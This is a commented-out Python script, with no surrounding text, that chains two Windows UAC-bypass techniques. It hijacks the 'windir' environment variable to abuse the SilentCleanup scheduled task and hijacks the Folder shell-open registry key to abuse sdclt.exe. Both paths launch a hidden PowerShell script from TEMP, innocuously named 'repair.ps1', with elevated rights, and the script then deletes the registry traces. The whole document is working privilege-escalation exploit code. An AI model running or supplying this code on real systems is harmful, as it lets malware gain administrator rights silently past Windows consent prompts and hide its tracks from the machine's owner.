# import os
# import subprocess
# import time
# import winreg
# 
# command = 'powershell.exe -NoProfile -WindowStyle Hidden -File "' + os.path.join(os.environ['TEMP'], 'repair.ps1') + '"'
# with winreg.CreateKey(winreg.HKEY_CURRENT_USER, 'Environment') as key:
#     winreg.SetValueEx(key, 'windir', 0, winreg.REG_SZ, command + ' & rem ')
# subprocess.run(['schtasks.exe', '/Run', '/TN', r'\Microsoft\Windows\DiskCleanup\SilentCleanup', '/I'], check=False)
# time.sleep(2)
# with winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Environment', 0, winreg.KEY_SET_VALUE) as key:
#     winreg.DeleteValue(key, 'windir')
# with winreg.CreateKey(winreg.HKEY_CURRENT_USER, r'Software\Classes\Folder\shell\open\command') as key:
#     winreg.SetValueEx(key, '', 0, winreg.REG_SZ, command)
# subprocess.run(['sdclt.exe', '/KickOffElev'], check=False)
# winreg.DeleteKey(winreg.HKEY_CURRENT_USER, r'Software\Classes\Folder\shell\open\command')
